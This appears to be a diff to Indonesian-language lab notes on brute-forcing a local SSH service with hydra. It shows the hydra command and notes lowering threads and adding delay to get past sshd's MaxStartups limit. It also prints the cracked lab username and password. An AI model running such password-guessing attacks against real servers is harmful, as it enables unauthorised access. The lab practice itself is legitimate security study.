@@ -18,3 +18,11 @@ hydra -I -l u0_a2027 -P passlist.txt -s 8022 -t 2 -W 1 -V 127.0.0.1 ssh
 
 # 5. Validasi akses
 ssh -p 8022 u0_a2027@127.0.0.1
+
+Root Cause: MaxStartups pada sshd lab memblokir 16 thread.
+Fix: Menurunkan thread dan menambah delay.
+Result: Berhasil mendapatkan kredensial dalam ∼16 menit.
+
+login: u0_a2027
+password: pamulang123
+
